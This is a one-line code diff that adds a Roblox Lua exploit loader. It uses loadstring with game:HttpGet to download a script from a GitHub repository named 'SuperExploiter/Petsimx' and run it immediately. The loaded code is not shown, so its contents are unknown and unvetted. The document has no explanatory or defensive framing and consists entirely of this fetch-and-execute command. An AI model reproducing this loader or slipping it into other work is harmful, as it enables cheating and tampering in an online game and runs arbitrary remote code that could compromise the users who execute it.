@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SuperExploiter/Petsimx/main/Script.lua"))()
